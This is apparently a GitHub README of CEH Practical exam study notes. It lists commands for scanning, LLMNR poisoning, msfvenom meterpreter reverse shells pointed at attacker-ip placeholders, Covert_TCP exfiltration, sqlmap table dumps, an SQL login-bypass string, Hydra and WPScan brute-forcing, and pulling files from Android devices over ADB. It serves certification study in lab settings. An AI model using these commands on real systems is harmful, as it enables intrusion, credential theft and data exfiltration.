<img src="/IMG/CEH-Practical-Logo.jpg">

# CEH-Practical-Notes-and-Tools
Successfully completed the CEH (Practical) exam by EC-Council with a score of 20/20! Took me around 2 hours 20 minutes to complete the 6 hour Proctored exam.  

> Just a typical CTF Player/Hacker going back to Basics 💻

> My Personal Notes that I used on the Exam as a Cheatsheet

# Network Hacking
<details>
  <summary>Netdiscover </summary>
  
## Netdiscover
  
* Scan Entire Network for ALive host using ARP
```console
netdiscover -i eth0
netdiscover -r x.x.x.1/24
```

</details>

<details>
  <summary>Nmap </summary>
  
## Nmap

* To scan the live Host
```console
nmap -sP x.x.x.1/24                 
nmap -sn x.x.x.1/24
```
* To find the Specific open port 
```console
nmap -p port x.x.x.1/24 --open
```
* To find the OS 
```console
nmap -O x.x.x.x 
```
* Comprehensive Scan
```console
nmap -Pn -A x.x.x.1/24 -vv --open   
```
</details>
<details>
  <summary>Wireshark</summary>
  
  ## Wireshark
  
  * Wireshark provides the feature of reassembling a stream of plain text protocol packets into a human-readable format
  
  ```shell
    select_packet > follow > TCP Stream
  ```
  
  * To the get the specific method like ( post , get )
  
  ```console
  http.request.method==post
  http.request.method==get
  ```
  * To the Find DOS & DDOS
  * go to Statistics and Select Conversations , sort by packets in IPv4 based on number of Packets transfer
  
  ```shell
  Statistics > Conversations > IPv4 > Packets
  
  ```
</details>

<details>
  <summary>Covert TCP</summary>
  
  ## Covert TCP
  
  * [covert_TCP](Covert_TCP.c) 
  * In this we have to use Covert TCP technique to analyses the pcapng file.
  * Traverse though each line in Wireshark and concentrate on Identification field, keep an eye on Hex value and ANSI value.
  * Compile the Code
  ```console
cc -o covert_tcp covert_tcp.c
  ```
  * Reciever Machine(Client_IP)
  ```console
  sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 9999 -dest_port 8888 -server -file recieve.txt
  ```
  * Sender Machine(Attacker_IP)
  * Create A Message file that need to be transferred Eg: secret.txt
  ```console
  sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 8888 -dest_port 9999 -file secret.txt
  ```
 
 * Secret message sent using Covert_TCP and it is captured using Wireshark - [Pcap_of_Covert](Covert_TCP_Capture.pcapng)
 * The Secret text is -> Hello  This 123 -

  <img src="/IMG/CovertWireshark.jpg" />

</details>

<details>
  <summary> LLMNR/NBT</summary>
  
  ##  LLMNR/NBT-NS Poisoning

* [Responder](https://github.com/lgandx/Responder) - rogue authentication server to capture hashes.

* This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present.
  
* In Parrot/Kali OS, 

```console
responder -I eth0  
```

* In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
* To crack that hash, use JohntheRipper

```console
john SMBfilename  
```
</details>

<details>
  <summary>Common Ports</summary>
  
 ## Common Port

* 21        - FTP
* 22        - SSH
* 23        - TELNET
* 3306      - MYSQL
* 389,3389  - RDP

</details>

<details>
  <summary>Port Login</summary>

  ## Port Login
    
  * FTP Login
    
  ```console
    ftp x.x.x.x
  ```
    
  * SSH Login  
  ```console
    ssh username@x.x.x.x
  ```
    
  * TELNET Login
  ```console
    telnet x.x.x.x
  ```
   
 </details>
</details>

# Web Hacking
<details>
  <summary>Nslookup</summary>

* To verify Website's Ip
```console
Nslookup wwww.example.com
```
  </details>
  <details>
  <summary>File Upload</summary>
  
  ## File Upload Vulnerability
  
* To create a PHP Payload 
* Copy the PHP code and create a .php
  
```console
msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attcker-port -f raw
```
  
* To create a Reverse_tcp Connection
```console
msfconsole
use exploit/multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST = attacker-ip
set LPORT = attcker-port
run
```
  
* To find the secret file 
```console
  type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
```
  </details>
<details>
  <summary>SQL Injection</summary>
  
  ## SQL Injection
  
  * Login bypass with [' or 1=1 --]
  
### DSSS
  
  * Damn Small SQLi Scanner ([DSSS](https://github.com/stamparm/DSSS)) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters)

  * As of optional settings it supports HTTP proxy together with HTTP header values User-Agent, Referer and Cookie.

  ```console
  python3 dsss.py -u "url" --cookie="cookie"
  ```
  <img src="/IMG/DSSS/dsss1.jpg" />
  
  * Open the binded URL
  
  <img src="/IMG/DSSS/dsss2.jpg" />

### SQLMAP
  
* List databases, add cookie values
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
```
* OR
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  
```

* List Tables, add databse name
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
```
* List Columns of that table
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
```
* Dump all values of the table
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
```
  </details>



</details>

# System Hacking

<details>
  <summary>System</summary>
  
  ## System 

  * To create a Payload 
```console
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 
```
* To take a reverse TCP connection from windows
```console
msfdb init && msfconsole 
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST= attacker-IP  
set LPORT= attacker-Port 
run
```

</details>

# Android Hacking
<details>
  <summary>ADB</summary>

  ## ADB
  
* To Install ADB
```console
apt-get update
sudo apt-get install adb -y
adb devices -l
```
* Connection Establish Steps

```console
adb connect x.x.x.x:5555
adb devices -l
adb shell  
```
* To navigate
```console
pwd
ls
cd Download
ls
cd sdcard
```
* Download a File from Android using ADB tool
```console
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop
```
</details>
<details>
  <summary>PhoneSploit</summary>
  
## PhoneSploit tool
  
* To install Phonesploit 

```console
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
OR
python3 -m pip install colorama
```
* To run Phonesploit
```console
python3 phonesploit.py
```
* Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
* Type 4, to Access Shell on phone
* Download File using PhoneSploit
```console
9. Pull Folders from Phone to PC
```
* Enter the Full Path of file to Download
```console
sdcard/Download/secret.txt
```  
</details>

# Password Cracking



<details>
  <summary>Wpscan</summary>
  
## Wordpress

* Wordpress site only Users Enumeration
```console
wpscan --url http://example.com/ceh --enumerate u
```
  * Direct crack if we have user/password detail
```console
wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt
```
</details>

<details>
  <summary>Hydra</summary>

## Hydra

### SSH
```console
hydra -l username -P passlist.txt x.x.x.x ssh
```
### FTP
```console
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x
```
* If the service isn't running on the default port, use -s
```console
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221
```
* FTP Get command
* Used to download the specific file from FTP to attacker or local machine
```console
get flag.txt ~/Desktop/filepath/flag.txt
get flag.txt .
```
### TELNET
```console
hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
```  
</details>
  
# Steganography
  <details>
    <summary>Snow</summary>

### Snow
    
* Whitespace Steganography using [Snow](https://darkside.com.au/snow/snwdos32.zip)
* To hide the Text  
  
```console
SNOW.EXE -C -p test -m "Secret Message" original.txt hide.txt
```

* To unhide the Hidden Text

```console
SNOW.EXE -C -p test hide.txt
```
<img src="/IMG/Snow.png"/>

</details>
<details>
  <summary>CrypTool</summary>
  
  ### CrypTool
  
  * [CrypTool](https://www.cryptool.org/en/ct1/downloads) for hex 
  
  <img src = "/IMG/Cryptool/CT.png"/>
  
  * To Encrypt
  
  <img src = "/IMG/Cryptool/CT5.png"/>
  <img src = "/IMG/Cryptool/CT6.png"/>
  
  * Use Key 05 
  
  <img src = "/IMG/Cryptool/CT7.png"/>
  <img src = "/IMG/Cryptool/CT8.png"/>
  <img src = "/IMG/Cryptool/CT9.png"/>
  <img src = "/IMG/Cryptool/CT10.png"/>
  <img src = "/IMG/Cryptool/CT11.png"/>
  
  * To Decrypt
  
  <img src = "/IMG/Cryptool/CT12.png"/>
  <img src = "/IMG/Cryptool/CT13.png"/>
  <img src = "/IMG/Cryptool/CT14.png"/>
  <img src = "/IMG/Cryptool/CT15.png"/>
  <img src = "/IMG/Cryptool/CT16.png"/>
 </details>
  
 <details>
   <summary>HashCalc</summary>
   
   ## HashCalc
    
   * HashCalc Interface.
   <img src = "/IMG/HashCalc/Hcal1.png"/>

   * Create a text file.
   <img src = "/IMG/HashCalc/Hcal2.png"/>
   
   * Choose text file.
   <img src = "/IMG/HashCalc/Hcal3.png"/>
   
   * Hash Value of text file.
   <img src = "/IMG/HashCalc/Hcal4.png"/>
   
   * Modify the text inside the file. 
   <img src = "/IMG/HashCalc/Hcal5.png"/>
   
   * Compare the hash, It will vary.
   <img src = "/IMG/HashCalc/Hcal6.png"/>
   
 </details>

  <details>
    <summary>HashMyFile</summary>
 
  ## HashMyFile  
    
  * HashMyFile Application
  <img src = "/IMG/HashMyFile/HMF1.png"/>
    
  * add folder to Hash the file presented in Folder  
  <img src = "/IMG/HashMyFile/HMF2.png"/>  
  <img src = "/IMG/HashMyFile/HMF3.png"/>

  * After Hash the file
  <img src = "/IMG/HashMyFile/HMF4.png"/>
    
  * Add More Hashing Format
  <img src = "/IMG/HashMyFile/HMF5.png"/>
</details>
  
  <details>
    <summary>MD5 Calculator</summary>
    
    ## MD5 Calculator  
  
  * Create a text file contains "Hello" and save it, Right click the file to compare hash. 
  <img src = "/IMG/MD5 Calc/MD5Calc1.png"/>  
  
  * MD5 Hash of text file
  <img src = "/IMG/MD5 Calc/MD5Calc2.png"/> 
  
  <img src = "/IMG/MD5 Calc/MD5Calc3.png"/>  
  
  <img src = "/IMG/MD5 Calc/MD5Calc4.png"/>  
  
</details>

<details>
    <summary>VeraCrypt</summary>
      
  ## VeraCrypt 

  
  <img src = "/IMG/VeraCrypt/VC1.png"/>
  <img src = "/IMG/VeraCrypt/VC2.png"/>
  <img src = "/IMG/VeraCrypt/VC3.png"/>
  <img src = "/IMG/VeraCrypt/VC4.png"/>
  <img src = "/IMG/VeraCrypt/VC5.png"/>
  <img src = "/IMG/VeraCrypt/VC6.png"/>
  <img src = "/IMG/VeraCrypt/VC7.png"/>
  <img src = "/IMG/VeraCrypt/VC8.png"/>
  <img src = "/IMG/VeraCrypt/VC9.png"/>
  <img src = "/IMG/VeraCrypt/VC10.png"/>
  <img src = "/IMG/VeraCrypt/VC11.png"/>
  <img src = "/IMG/VeraCrypt/VC12.png"/>
  <img src = "/IMG/VeraCrypt/VC13.png"/>
  <img src = "/IMG/VeraCrypt/VC14.png"/>
  <img src = "/IMG/VeraCrypt/VC15.png"/>
  <img src = "/IMG/VeraCrypt/VC16.png"/>
  <img src = "/IMG/VeraCrypt/VC17.png"/>
  <img src = "/IMG/VeraCrypt/VC18.png"/>
  
</details> 

<details>
    <summary>BCTextEncoded</summary>
  
  ## BCTextEncoded
    
  <img src = "/IMG/BCTextEncoded/BCTE1.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE2.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE3.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE4.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE5.png"/>

  <img src = "/IMG/BCTextEncoded/BCTE6.png"/>


</details>

<details>
    <summary>Keywords</summary>
  
  ## Keywords
  
  
  * Img hidden      - Openstego
  * .hex            - Cryptool
  * Whitespace      - SNOW
  * MD5             - Hashcalc & MD5 Calculator
  * Encoded         - BCTexteditor
  * Volume & mount  - Veracrypt

</details>

# File Transfer
<details>
  <summary>File Transfer</summary>
  
## File Transfer

### Linux to Windows
* used to send a payload by Apache 
```console
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /root/Desktop/filename /var/www/html/share/
  ```
  * to start and verify
  ```console
  service apache2 start 
  service apache2 status
  ```
  * to Download from Windows
  * Open browser 
  ```shell
  IP_OF_LINUX/share
  ```
### Windows to Linux 
* File system > Network > smb///IP_OF_WINDOWS
</details>


# Resource
<details>
  <summary>Course</summary>

  ## Course
  
* [Penetration Testing Student - PTS ](https://my.ine.com/CyberSecurity/learning-paths/a223968e-3a74-45ed-884d-2d16760b8bbd/penetration-testing-student) from [INE](https://my.ine.com/)
* [Practical Ethical Hacking - PEH ](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course) from [TCM Security](https://tcm-sec.com/)
* [iLab](https://ilabs.eccouncil.org/ethical-hacking-exercises/) CEH (Practical) Official Lab from [EC-Council](https://www.eccouncil.org/)
* [Youtube free iLab ](https://www.youtube.com/watch?v=9g5gdhoDotg&list=PLWGnVet-gN_kGHSHbWbeI0gtfYx3PnDZO)

</details>
<details>
  <summary>TryHackMe</summary>

## TryHackMe
### Learning Path
* [Pre-Security](https://tryhackme.com/paths) 
* [Jr Penetration Tester](https://tryhackme.com/paths)
* [Complete Beginner](https://tryhackme.com/paths) 
### Rooms
* [Linux](https://tryhackme.com/module/linux-fundamentals)
* [Nmap](https://tryhackme.com/room/furthernmap)
* [SQLMAP](https://tryhackme.com/room/sqlmap)
* [Wireshark](https://tryhackme.com/room/wireshark)
* [Hydra](https://tryhackme.com/room/hydra)
* [DVWA](https://tryhackme.com/room/dvwa)
* [OWASP Top 10](https://tryhackme.com/room/owasptop10)

  
</details>  

<details>
  <summary>Useful Links</summary>
  
## Links
* [hash.com](https://hashes.com/en/decrypt/hash) is a online hash Identifier and Cracker 
</details>

Final Words: Grab a cup of Tea ☕ and GRIND!!!

  <img src = "/IMG/motivation.jpg"/>
